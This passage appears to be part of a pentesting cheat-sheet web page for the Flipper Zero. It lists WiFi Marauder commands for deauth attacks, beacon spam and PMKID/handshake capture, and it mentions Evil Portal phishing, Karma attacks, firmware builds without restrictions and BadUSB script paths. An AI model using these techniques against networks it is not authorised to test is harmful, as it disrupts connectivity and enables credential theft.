+          <h3 class="text-lime-700 dark:text-lime-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📶 </span>WiFi Devboard (Marauder)</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Launch Marauder</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: GPIO → ESP → WiFi Marauder">GPIO → ESP → WiFi Marauder</code></td></tr>
+              <tr><td>Scan APs</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: scanap">scanap</code></td></tr>
+              <tr><td>Scan Stations</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: scansta">scansta</code></td></tr>
+              <tr><td>Select Target</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: select -a [INDEX]">select -a [INDEX]</code></td></tr>
+              <tr><td>Deauth Attack</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: attack -t deauth">attack -t deauth</code></td></tr>
+              <tr><td>Beacon Spam</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: attack -t beacon -l">attack -t beacon -l</code></td></tr>
+              <tr><td>Rickroll Beacon</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: attack -t rickroll">attack -t rickroll</code></td></tr>
+              <tr><td>PMKID Capture</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: sniff pmkid">sniff pmkid</code></td></tr>
+              <tr><td>Stop Attack</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: stopscan">stopscan</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- WiFi Devboard Attacks -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-green-100 dark:bg-neon-green/20">
+          <h3 class="text-green-700 dark:text-neon-green font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">🎯 </span>WiFi Attack Techniques</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Evil Portal</td><td>Fake captive portal phishing</td></tr>
+              <tr><td>Karma Attack</td><td>Auto-respond to probe requests</td></tr>
+              <tr><td>Handshake Capture</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: sniff pkt">sniff pkt</code> → Save PCAP</td></tr>
+              <tr><td>Deauth + Capture</td><td>Force reconnect for handshake</td></tr>
+              <tr><td>Probe Sniff</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: sniff probe">sniff probe</code></td></tr>
+              <tr><td>Set Channel</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: channel [1-14]">channel [1-14]</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Firmware Options -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-stone-100 dark:bg-stone-500/20">
+          <h3 class="text-stone-700 dark:text-stone-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">⚙️ </span>Firmware Options</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Official</td><td>flipperzero.one/update</td></tr>
+              <tr><td>Unleashed</td><td>Extended Sub-GHz, no restrictions</td></tr>
+              <tr><td>Momentum</td><td>Fork of Xtreme, active dev</td></tr>
+              <tr><td>RogueMaster</td><td>Many plugins, games, animations</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Firmware Comparison -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-zinc-100 dark:bg-zinc-500/20">
+          <h3 class="text-zinc-700 dark:text-zinc-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📊 </span>Firmware Comparison</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-xs">
+            <thead>
+              <tr class="text-left border-b border-gray-300 dark:border-gray-700">
+                <th class="pb-2">Feature</th>
+                <th class="pb-2">Official</th>
+                <th class="pb-2">Unleashed</th>
+                <th class="pb-2">Momentum</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td>Sub-GHz Range</td><td>Limited</td><td>Extended</td><td>Extended</td></tr>
+              <tr><td>Rolling Codes</td><td>No</td><td>Yes</td><td>Yes</td></tr>
+              <tr><td>Extra Plugins</td><td>Few</td><td>Many</td><td>Most</td></tr>
+              <tr><td>Stability</td><td>Best</td><td>Great</td><td>Good</td></tr>
+              <tr><td>Updates</td><td>Slow</td><td>Fast</td><td>Fast</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Useful Apps -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-slate-100 dark:bg-slate-500/20">
+          <h3 class="text-slate-700 dark:text-slate-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📦 </span>Useful Apps</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>WiFi Marauder</td><td>ESP32 WiFi attacks</td></tr>
+              <tr><td>Evil Portal</td><td>Captive portal phishing</td></tr>
+              <tr><td>UART Terminal</td><td>Serial debugging</td></tr>
+              <tr><td>SPI Mem Manager</td><td>Read/write SPI flash</td></tr>
+              <tr><td>NRF24 Sniffer</td><td>Mouse/keyboard attacks</td></tr>
+              <tr><td>Spectrum Analyzer</td><td>View RF spectrum</td></tr>
+              <tr><td>TPMS Reader</td><td>Tire pressure sensors</td></tr>
+              <tr><td>Pocsag Pager</td><td>Pager message decode</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- File Management -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-neutral-100 dark:bg-neutral-500/20">
+          <h3 class="text-neutral-700 dark:text-neutral-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📁 </span>File Management</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>USB Mass Storage</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Settings → Storage">Settings → Storage</code></td></tr>
+              <tr><td>qFlipper (Desktop)</td><td>flipperzero.one/update</td></tr>
+              <tr><td>Mobile App</td><td>iOS/Android via Bluetooth</td></tr>
+              <tr><td>Sub-GHz Files</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: SD/subghz/*.sub">SD/subghz/*.sub</code></td></tr>
+              <tr><td>NFC Files</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: SD/nfc/*.nfc">SD/nfc/*.nfc</code></td></tr>
+              <tr><td>RFID Files</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: SD/lfrfid/*.rfid">SD/lfrfid/*.rfid</code></td></tr>
+              <tr><td>IR Files</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: SD/infrared/*.ir">SD/infrared/*.ir</code></td></tr>
+              <tr><td>BadUSB Scripts</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: SD/badusb/*.txt">SD/badusb/*.txt</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Troubleshooting -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-rose-100 dark:bg-rose-500/20">
+          <h3 class="text-rose-700 dark:text-rose-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">🔧 </span>Troubleshooting</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>No SD Card</td><td>Format as FAT32, &lt;256GB</td></tr>
+              <tr><td>Sub-GHz No Read</td><td>Check antenna, move closer</td></tr>
+              <tr><td>NFC Won't Read</td><td>Center card on back exactly</td></tr>
+              <tr><td>BadUSB Fails</td><td>Check keyboard layout (US_qwerty)</td></tr>
+              <tr><td>Screen Issues</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Settings → LCD → Contrast">Settings → LCD → Contrast</code></td></tr>
+              <tr><td>Battery Drain</td><td>Disable Bluetooth when not used</td></tr>
+              <tr><td>DFU Mode</td><td>Hold ← + Back during boot</td></tr>
+              <tr><td>Reset to Stock</td><td>Flash via qFlipper DFU</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Related Topics -->
+    <div class="mt-12">
+      <div class="mt-16 pt-8 border-t border-gray-200 dark:border-hacker-border">
+  <h2 class="text-xl font-bold text-gray-900 dark:text-white mb-6 flex items-center gap-2" data-emoji-processed="true">
+    <svg class="w-5 h-5 text-emerald-700 dark:text-neon-green" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path>
+    </svg>
+    Related Topics
+  </h2>
+  
+  <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
+    <a href="/wireless-pentesting" class="block p-4 bg-gray-50 dark:bg-hacker-darker rounded-lg border border-gray-200 dark:border-hacker-border transition-all duration-200 hover:border-neon-green/50 hover:bg-neon-green/5">
+        <div class="flex items-start gap-3">
+          <span class="flex-shrink-0 text-emerald-700 dark:text-neon-green">
+            
+            
+            
+            
+            
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path>
+              </svg>
+          </span>
+          <div>
+            <h3 class="font-semibold text-gray-900 dark:text-white text-sm" data-emoji-processed="true">Wireless Pentesting</h3>
+            <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">RF and WiFi attack techniques</p>
+          </div>
+        </div>
+      </a><a href="/physical-security" class="block p-4 bg-gray-50 dark:bg-hacker-darker rounded-lg border border-gray-200 dark:border-hacker-border transition-all duration-200 hover:border-neon-green/50 hover:bg-neon-green/5">
+        <div class="flex items-start gap-3">
+          <span class="flex-shrink-0 text-emerald-700 dark:text-neon-green">
+            
+            
+            
+            
+            
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path>
+              </svg>
+          </span>
+          <div>
+            <h3 class="font-semibold text-gray-900 dark:text-white text-sm" data-emoji-processed="true">Physical Security</h3>
+            <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">Physical penetration testing</p>
+          </div>
+        </div>
+      </a><a href="/iot-pentesting" class="block p-4 bg-gray-50 dark:bg-hacker-darker rounded-lg border border-gray-200 dark:border-hacker-border transition-all duration-200 hover:border-neon-green/50 hover:bg-neon-green/5">
+        <div class="flex items-start gap-3">
+          <span class="flex-shrink-0 text-emerald-700 dark:text-neon-green">
+            
+            
+            
+            
+            
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path>
+              </svg>
+          </span>
+          <div>
+            <h3 class="font-semibold text-gray-900 dark:text-white text-sm" data-emoji-processed="true">IoT Pentesting</h3>
+            <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">Internet of Things security</p>
+          </div>
+        </div>
+      </a><a href="/cheatsheets/wireshark" class="block p-4 bg-gray-50 dark:bg-hacker-darker rounded-lg border border-gray-200 dark:border-hacker-border transition-all duration-200 hover:border-neon-green/50 hover:bg-neon-green/5">
+        <div class="flex items-start gap-3">
+          <span class="flex-shrink-0 text-emerald-700 dark:text-neon-green">
+            
+            
+            
+            
+            
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path>
+              </svg>
+          </span>
+          <div>
+            <h3 class="font-semibold text-gray-900 dark:text-white text-sm" data-emoji-processed="true">Wireshark</h3>
+            <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">Packet capture and analysis</p>
+          </div>
+        </div>
+      </a>
+  </div>
+</div>
+    </div>
+
+  </div>
+  
+  </div>
+
+  <!-- Print Footer (only shows when printing) -->
+  <div class="hidden print:block print:mt-8 print:pt-4 print:border-t print:border-gray-300" data-astro-cid-lyloq733="">
+    <p class="text-xs text-gray-500" data-astro-cid-lyloq733="">
+      Generated from Hackers Manifest | For authorized security testing only | hackersmanifest.com
+    </p>
+  </div>
+
+  <hr style="border-color: #333; margin: 20px 0;">
+  <p style="color: #666; font-size: 12px;">Downloaded from hackersmanifest.com | For authorized security testing only</p>
+</body>
+</html>
